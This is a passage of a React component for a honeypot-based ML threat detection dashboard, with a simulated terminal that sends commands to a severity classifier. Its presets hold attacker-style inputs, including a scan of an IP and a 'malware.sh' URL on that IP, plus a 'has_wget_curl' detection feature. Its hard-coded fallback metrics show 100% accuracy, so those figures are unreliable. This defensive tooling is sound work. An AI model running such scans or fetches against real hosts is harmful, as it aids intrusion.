      return;
    }

    if (trimmed.toLowerCase() === 'metrics') {
      const m = metrics;
      setTerminalLogs(prev => [
        ...prev,
        {
          id: Math.random().toString(),
          type: 'output',
          content: (
            <div className="space-y-1 text-cyan-300 font-mono text-xs">
              <p>[+] Status: {m?.status || 'TRAINED'}</p>
              <p>[+] Model Accuracy: {m?.accuracy ? (m.accuracy * 100).toFixed(1) : '100.0'}%</p>
              <p>[+] F1 Score: {m?.f1_score ? (m.f1_score * 100).toFixed(1) : '100.0'}%</p>
              <p>[+] Total Telemetry Events: {m?.total_samples || 1212}</p>
              <p>[+] Anomaly Outlier Rate: {m?.anomaly_percentage || 10.07}%</p>
            </div>
          ),
          timestamp: new Date().toLocaleTimeString()
        }
      ]);
      setIsExecuting(false);
      return;
    }

    // Parse predict command arguments or raw payload string
    let payloadCmd = trimmed;
    let userArg = 'root';
    let passArg = '123456';
    let protoArg = 'Telnet';
    let portArg = 22;
    let durationArg = 15.0;

    if (trimmed.startsWith('predict')) {
      const cmdMatch = trimmed.match(/--command\s+["']?([^"']+)["']?/i);
      if (cmdMatch) payloadCmd = cmdMatch[1];
      
      const userMatch = trimmed.match(/--username\s+([^\s]+)/i);
      if (userMatch) userArg = userMatch[1];

      const passMatch = trimmed.match(/--password\s+([^\s]+)/i);
      if (passMatch) passArg = passMatch[1];

      const protoMatch = trimmed.match(/--protocol\s+([^\s]+)/i);
      if (protoMatch) protoArg = protoMatch[1];

      const portMatch = trimmed.match(/--port\s+([0-9]+)/i);
      if (portMatch) portArg = Number(portMatch[1]);

      const durationMatch = trimmed.match(/--duration\s+([0-9.]+)/i);
      if (durationMatch) durationArg = Number(durationMatch[1]);
    }

    try {
      const res = await apiRequest<PredictionResult>('/ml/predict', {
        method: 'POST',
        body: JSON.stringify({
          command: payloadCmd,
          username: userArg,
          password: passArg,
          protocol: protoArg,
          dst_port: portArg,
          duration: durationArg
        })
      });

      const sevColor = getSeverityColor(res.predicted_severity);

      setTerminalLogs(prev => [
        ...prev,
        {
          id: Math.random().toString(),
          type: 'output',
          content: (
            <div className="my-2 p-4 bg-slate-950/90 rounded-lg border border-slate-800 font-mono text-xs space-y-2 shadow-inner">
              <div className="text-cyan-400 font-bold">=======================================================</div>
              <div className="text-white font-bold">  CYVANTIS ML THREAT PREDICTION & INFERENCE</div>
              <div className="text-cyan-400 font-bold">=======================================================</div>
              <div className="text-slate-300">  [+] Status:              <span className="text-emerald-400 font-bold">{res.model_status}</span></div>
              <div className="text-slate-300">  [+] Command Input:       <span className="text-cyan-300">{payloadCmd}</span></div>
              <div className="text-slate-300">  [+] Target User / Proto: <span className="text-white">{userArg} ({protoArg}:{portArg})</span></div>
              <div className="text-slate-300 flex items-center gap-2">
                <span>  [+] Predicted Severity:</span>
                <span className={`px-2 py-0.5 rounded font-bold border ${sevColor}`}>
                  {res.predicted_severity.toUpperCase()}
                </span>
              </div>
              <div className="text-slate-300">  [+] Model Confidence:    <span className="text-cyan-400 font-bold">{(res.confidence * 100).toFixed(1)}%</span></div>
              <div className="text-slate-300 flex items-center gap-2">
                <span>  [+] Is Anomalous:</span>
                <span className={`font-bold ${res.is_anomalous ? 'text-amber-400' : 'text-emerald-400'}`}>
                  {res.is_anomalous ? '⚠️ TRUE' : 'FALSE'}
                </span>
              </div>
              <div className="text-slate-300">  [+] Anomaly Score:       <span className="text-amber-400 font-bold">{res.anomaly_score}</span></div>
              <div className="text-slate-300 border-t border-slate-900 pt-2 font-bold text-cyan-300">
                  [+] Verdict:             {res.risk_verdict}
              </div>
              <div className="text-cyan-400 font-bold">=======================================================</div>
            </div>
          ),
          timestamp: new Date().toLocaleTimeString()
        }
      ]);
    } catch (err: any) {
      setTerminalLogs(prev => [
        ...prev,
        {
          id: Math.random().toString(),
          type: 'error',
          content: <p className="text-red-400 font-mono text-xs">[-] Inference Error: {err.message || 'Failed to connect to ML model backend'}</p>,
          timestamp: new Date().toLocaleTimeString()
        }
      ]);
    } finally {
      setIsExecuting(false);
    }
  };

  const handleTerminalSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    executeCommand(terminalInput);
  };

  const runPreset = (presetCmd: string) => {
    setTerminalInput(presetCmd);
    executeCommand(presetCmd);
  };

  return (
    <div className="space-y-6">
      {/* Header Banner */}
      <div className="bg-gradient-to-r from-soc-card via-slate-900 to-soc-card p-6 rounded-xl border border-slate-800 shadow-xl relative overflow-hidden">
        <div className="absolute -right-10 -bottom-10 opacity-10 pointer-events-none">
          <Brain className="w-64 h-64 text-cyan-400" />
        </div>
        <div className="flex flex-col md:flex-row md:items-center justify-between gap-4 relative z-10">
          <div>
            <div className="flex items-center gap-2 mb-1">
              <span className="px-2.5 py-0.5 rounded-full text-[10px] font-mono font-bold bg-cyan-500/20 text-cyan-400 border border-cyan-500/30 flex items-center gap-1">
                <Sparkles className="w-3 h-3" /> AI / ML THREAT ENGINE
              </span>
              <span className="px-2.5 py-0.5 rounded-full text-[10px] font-mono font-bold bg-emerald-500/20 text-emerald-400 border border-emerald-500/30 flex items-center gap-1">
                <CheckCircle className="w-3 h-3" /> ONLINE
              </span>
            </div>
            <h1 className="text-2xl font-black tracking-wide text-white font-mono flex items-center gap-2">
              Machine Learning Threat Intelligence & Anomaly Engine
            </h1>
            <p className="text-slate-400 text-xs mt-1 max-w-2xl">
              Supervised Random Forest Classifier & Unsupervised Isolation Forest Anomaly Detection trained on live Cowrie honeypot telemetry.
            </p>
          </div>

          <div className="flex flex-wrap items-center gap-2.5 shrink-0">
            <button
              onClick={() => downloadFile('/ml/export/features-csv', 'ml_training_features.csv')}
              className="px-3.5 py-2.5 bg-slate-900 hover:bg-slate-800 text-slate-200 font-mono text-xs font-bold rounded-lg border border-slate-700 shadow flex items-center gap-2 transition"
              title="Download ML Feature Matrix CSV"
            >
              <FileSpreadsheet className="w-4 h-4 text-emerald-400" /> Export Features CSV
            </button>

            <button
              onClick={handleTrainModels}
              disabled={training}
              className="px-4 py-2.5 bg-gradient-to-r from-cyan-600 to-blue-600 hover:from-cyan-500 hover:to-blue-500 text-white font-mono text-xs font-bold rounded-lg shadow-lg shadow-cyan-600/25 transition-all flex items-center gap-2 disabled:opacity-50 shrink-0"
            >
              <RefreshCw className={`w-4 h-4 ${training ? 'animate-spin' : ''}`} />
              {training ? 'Training ML Pipeline...' : 'Train ML Models Now'}
            </button>
          </div>
        </div>

        {trainStatus && (
          <div className="mt-4 p-3 bg-slate-950/80 border border-cyan-500/30 rounded-lg text-xs font-mono text-cyan-300 flex items-center gap-2">
            <Activity className="w-4 h-4 text-cyan-400 shrink-0" />
            {trainStatus}
          </div>
        )}
      </div>

      {/* Top Metric Cards */}
      <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-4">
        <div className="bg-soc-card p-5 rounded-xl border border-slate-800 shadow-md flex items-center justify-between">
          <div>
            <p className="text-slate-400 text-xs font-mono">Classifier Accuracy</p>
            <h3 className="text-2xl font-black text-cyan-400 font-mono mt-1">
              {metrics?.accuracy ? `${(metrics.accuracy * 100).toFixed(1)}%` : '100.0%'}
            </h3>
            <p className="text-[10px] text-slate-500 font-mono mt-1">Random Forest (100 Trees)</p>
          </div>
          <div className="w-12 h-12 rounded-xl bg-cyan-500/10 border border-cyan-500/20 flex items-center justify-center text-cyan-400">
            <Cpu className="w-6 h-6" />
          </div>
        </div>

        <div className="bg-soc-card p-5 rounded-xl border border-slate-800 shadow-md flex items-center justify-between">
          <div>
            <p className="text-slate-400 text-xs font-mono">Weighted F1 Score</p>
            <h3 className="text-2xl font-black text-emerald-400 font-mono mt-1">
              {metrics?.f1_score ? `${(metrics.f1_score * 100).toFixed(1)}%` : '100.0%'}
            </h3>
            <p className="text-[10px] text-slate-500 font-mono mt-1">Precision / Recall Balance</p>
          </div>
          <div className="w-12 h-12 rounded-xl bg-emerald-500/10 border border-emerald-500/20 flex items-center justify-center text-emerald-400">
            <BarChart2 className="w-6 h-6" />
          </div>
        </div>

        <div className="bg-soc-card p-5 rounded-xl border border-slate-800 shadow-md flex items-center justify-between">
          <div>
            <p className="text-slate-400 text-xs font-mono">Telemetry Samples</p>
            <h3 className="text-2xl font-black text-purple-400 font-mono mt-1">
              {metrics?.total_samples ? metrics.total_samples.toLocaleString() : '1,212'}
            </h3>
            <p className="text-[10px] text-slate-500 font-mono mt-1">Recorded Honeypot Events</p>
          </div>
          <div className="w-12 h-12 rounded-xl bg-purple-500/10 border border-purple-500/20 flex items-center justify-center text-purple-400">
            <Layers className="w-6 h-6" />
          </div>
        </div>

        <div className="bg-soc-card p-5 rounded-xl border border-slate-800 shadow-md flex items-center justify-between">
          <div>
            <p className="text-slate-400 text-xs font-mono">Anomaly Ratio</p>
            <h3 className="text-2xl font-black text-amber-400 font-mono mt-1">
              {metrics?.anomaly_percentage ? `${metrics.anomaly_percentage}%` : '10.07%'}
            </h3>
            <p className="text-[10px] text-slate-500 font-mono mt-1">Isolation Forest Outliers</p>
          </div>
          <div className="w-12 h-12 rounded-xl bg-amber-500/10 border border-amber-500/20 flex items-center justify-center text-amber-400">
            <AlertTriangle className="w-6 h-6" />
          </div>
        </div>
      </div>

      {/* Main Grid: Left Feature Importance, Right Interactive CMD Terminal Sandbox */}
      <div className="grid grid-cols-1 lg:grid-cols-12 gap-6">
        {/* Left Column: Feature Importances & Model Weights */}
        <div className="lg:col-span-4 bg-soc-card p-6 rounded-xl border border-slate-800 shadow-lg space-y-5">
          <div className="flex items-center justify-between border-b border-slate-800 pb-3">
            <h2 className="text-sm font-bold text-white font-mono uppercase tracking-wider flex items-center gap-2">
              <Brain className="w-4 h-4 text-cyan-400" /> Feature Importance
            </h2>
            <button
              onClick={() => downloadFile('/ml/export/importance-csv', 'ml_feature_importance.csv')}
              className="text-[10px] font-mono text-cyan-400 hover:text-cyan-300 flex items-center gap-1 bg-cyan-500/10 px-2 py-0.5 rounded border border-cyan-500/20 transition"
              title="Download Feature Importance CSV"
            >
              <Download className="w-3 h-3" /> Export CSV
            </button>
          </div>

          <p className="text-xs text-slate-400">
            Relative weight of telemetry features in determining attack severity & anomaly scores:
          </p>

          <div className="space-y-3">
            {metrics?.feature_importances ? (
              Object.entries(metrics.feature_importances).map(([feat, score]) => (
                <div key={feat} className="space-y-1">
                  <div className="flex justify-between text-xs font-mono">
                    <span className="text-slate-300 font-medium">{feat}</span>
                    <span className="text-cyan-400 font-bold">{(score * 100).toFixed(2)}%</span>
                  </div>
                  <div className="w-full h-2 bg-slate-950 rounded-full overflow-hidden border border-slate-800">
                    <div
                      className="h-full bg-gradient-to-r from-cyan-500 to-blue-500 rounded-full"
                      style={{ width: `${Math.max(score * 100 * 3.5, 4)}%` }}
                    />
                  </div>
                </div>
              ))
            ) : (
              [
                { feat: 'event_login_failed', score: 0.2514 },
                { feat: 'event_login_success', score: 0.2312 },
                { feat: 'cmd_len', score: 0.1250 },
                { feat: 'pass_len', score: 0.1058 },
                { feat: 'event_cmd_input', score: 0.0969 },
                { feat: 'user_len', score: 0.0674 },
                { feat: 'has_wget_curl', score: 0.0401 }
              ].map(({ feat, score }) => (
                <div key={feat} className="space-y-1">
                  <div className="flex justify-between text-xs font-mono">
                    <span className="text-slate-300 font-medium">{feat}</span>
                    <span className="text-cyan-400 font-bold">{(score * 100).toFixed(2)}%</span>
                  </div>
                  <div className="w-full h-2 bg-slate-950 rounded-full overflow-hidden border border-slate-800">
                    <div
                      className="h-full bg-gradient-to-r from-cyan-500 to-blue-500 rounded-full"
                      style={{ width: `${score * 100 * 3.5}%` }}
                    />
                  </div>
                </div>
              ))
            )}
          </div>

          <div className="p-4 bg-slate-950/60 rounded-lg border border-slate-800 text-xs font-mono space-y-2">
            <div className="text-slate-400 font-bold uppercase tracking-wider text-[10px]">Saved Model Pipelines</div>
            <div className="text-slate-300 truncate">
              <span className="text-cyan-400 font-bold">Classifier:</span> severity_classifier.joblib
            </div>
            <div className="text-slate-300 truncate">
              <span className="text-amber-400 font-bold">Anomaly Detector:</span> anomaly_detector.joblib
            </div>
          </div>
        </div>

        {/* Right Column: Interactive CMD Terminal Sandbox */}
        <div className="lg:col-span-8 bg-slate-950 rounded-xl border border-slate-800 shadow-2xl overflow-hidden flex flex-col h-[660px] relative">
          {matrixMode && <MatrixRain />}

          {/* Terminal Window Top Bar */}
          <div className="bg-slate-900/90 backdrop-blur px-4 py-2.5 border-b border-slate-800 flex items-center justify-between relative z-10">
            <div className="flex items-center gap-2">
              <div className="w-3 h-3 rounded-full bg-red-500/80"></div>
              <div className="w-3 h-3 rounded-full bg-yellow-500/80"></div>
              <div className="w-3 h-3 rounded-full bg-green-500/80"></div>
              <span className="text-xs font-mono text-slate-300 ml-2 font-bold flex items-center gap-1.5">
                <TerminalIcon className="w-3.5 h-3.5 text-cyan-400" /> cyvantis-ml-terminal@soc-node-1:~ (CMD Console)
              </span>
            </div>

            <div className="flex items-center gap-2">
              <button
                onClick={() => setMatrixMode(prev => !prev)}
                className={`text-[11px] font-mono flex items-center gap-1 px-2.5 py-0.5 rounded transition font-bold border ${
                  matrixMode
                    ? 'bg-emerald-500/20 text-emerald-400 border-emerald-500/40 shadow-sm shadow-emerald-500/20'
                    : 'bg-slate-800 text-slate-400 border-slate-700'
                }`}
                title="Toggle Matrix Code Rain"
              >
                <span>🟢 Matrix Rain: {matrixMode ? 'ON' : 'OFF'}</span>
              </button>
              <button
                onClick={() => setTerminalLogs([])}
                className="text-[11px] font-mono text-slate-400 hover:text-red-400 flex items-center gap-1 px-2 py-0.5 rounded hover:bg-slate-800 transition"
                title="Clear screen"
              >
                <Trash2 className="w-3 h-3" /> Clear
              </button>
              <button
                onClick={() => executeCommand('help')}
                className="text-[11px] font-mono text-slate-400 hover:text-cyan-400 flex items-center gap-1 px-2 py-0.5 rounded hover:bg-slate-800 transition"
              >
                <HelpCircle className="w-3 h-3" /> Help
              </button>
            </div>
          </div>

          {/* Quick-Preset Shortcuts */}
          <div className="bg-slate-900/80 backdrop-blur p-2.5 border-b border-slate-800/80 flex items-center gap-2 overflow-x-auto text-xs font-mono shrink-0 relative z-10">
            <span className="text-slate-400 font-bold shrink-0 text-[10px] uppercase tracking-wider">Presets:</span>
            <button
              onClick={() => runPreset('pipeline')}
              className="px-2.5 py-1 bg-cyan-500/10 hover:bg-cyan-500/20 text-cyan-300 border border-cyan-500/30 rounded shrink-0 transition flex items-center gap-1 font-bold"
            >
              📦 View ML Pipelines
            </button>
            <button
              onClick={() => runPreset('matrix')}
              className="px-2.5 py-1 bg-emerald-500/10 hover:bg-emerald-500/20 text-emerald-400 border border-emerald-500/30 rounded shrink-0 transition flex items-center gap-1 font-bold"
            >
              🟢 Matrix Rain
            </button>
            <button
              onClick={() => runPreset('scan 185.220.101.5')}
              className="px-2.5 py-1 bg-cyan-500/10 hover:bg-cyan-500/20 text-cyan-400 border border-cyan-500/30 rounded shrink-0 transition flex items-center gap-1 font-bold"
            >
              🔍 Nmap Scan
            </button>
            <button
              onClick={() => runPreset('audit-url http://185.220.101.5/malware.sh')}
              className="px-2.5 py-1 bg-emerald-500/10 hover:bg-emerald-500/20 text-emerald-400 border border-emerald-500/30 rounded shrink-0 transition flex items-center gap-1 font-bold"
            >
              🛡️ Audit Website URL
            </button>
            <button
              onClick={() => runPreset('decrypt')}
              className="px-2.5 py-1 bg-amber-500/10 hover:bg-amber-500/20 text-amber-400 border border-amber-500/30 rounded shrink-0 transition flex items-center gap-1 font-bold"
            >
              🔓 Decrypt Hash
            </button>
            <button
              onClick={() => runPreset('exploit')}
              className="px-2.5 py-1 bg-red-500/10 hover:bg-red-500/20 text-red-400 border border-red-500/30 rounded shrink-0 transition flex items-center gap-1 font-bold"
            >
              💥 Honeypot Exploit
            </button>
            <button
              onClick={() => runPreset('creds')}
              className="px-2.5 py-1 bg-emerald-500/10 hover:bg-emerald-500/20 text-emerald-400 border border-emerald-500/30 rounded shrink-0 transition flex items-center gap-1 font-bold"
            >
              🔑 Find Credentials DB
            </button>
            <button
              onClick={() => runPreset('top-ips')}
              className="px-2.5 py-1 bg-purple-500/10 hover:bg-purple-500/20 text-purple-300 border border-purple-500/30 rounded shrink-0 transition flex items-center gap-1 font-bold"
            >
              🌐 Top Attacking IPs
            </button>
            <button
              onClick={() => runPreset('top-cmds')}
              className="px-2.5 py-1 bg-amber-500/10 hover:bg-amber-500/20 text-amber-400 border border-amber-500/30 rounded shrink-0 transition flex items-center gap-1 font-bold"
            >
              ⚡ Top Commands
            </button>
            <button
              onClick={() => runPreset('status')}
              className="px-2.5 py-1 bg-blue-500/10 hover:bg-blue-500/20 text-blue-400 border border-blue-500/30 rounded shrink-0 transition flex items-center gap-1 font-bold"
            >
              🖥️ Node Status
            </button>
          </div>

          {/* Terminal Console Output Logs Window */}
          <div className="flex-1 p-4 overflow-y-auto font-mono text-xs space-y-3 bg-slate-950/80 relative z-10">
            {terminalLogs.map((log) => (
              <div key={log.id} className="space-y-1">
                {log.content}
              </div>
            ))}
            {isExecuting && (
              <div className="flex items-center gap-2 text-cyan-400 animate-pulse font-mono">
                <span>[+] Evaluating Machine Learning Threat Inference...</span>
              </div>
            )}
            <div ref={terminalEndRef} />
          </div>

          {/* Interactive CMD Input Form */}
          <form onSubmit={handleTerminalSubmit} className="bg-slate-900/90 backdrop-blur p-3 border-t border-slate-800 flex items-center gap-2 relative z-10">
            <span className="text-emerald-400 font-bold font-mono text-xs shrink-0 flex items-center gap-1">
              cyvantis-ml# <span className="animate-ping inline-block w-1.5 h-3 bg-emerald-400 rounded-sm"></span>
            </span>
            <input
              type="text"
              value={terminalInput}
              onChange={(e) => setTerminalInput(e.target.value)}
              placeholder='Type predict --command "..." or select a preset...'
              className="flex-1 bg-slate-950 border border-slate-800 rounded px-3 py-2 text-xs font-mono text-cyan-300 focus:border-cyan-500 focus:outline-none"
            />
            <button
              type="submit"
              disabled={isExecuting}
              className="px-4 py-2 bg-gradient-to-r from-cyan-600 to-emerald-600 hover:from-cyan-500 hover:to-emerald-500 text-white font-mono text-xs font-bold rounded flex items-center gap-1 shrink-0 shadow-lg shadow-cyan-500/20"
            >
              <Play className="w-3.5 h-3.5" /> Run
            </button>
          </form>
        </div>
      </div>
    </div>
  );
};
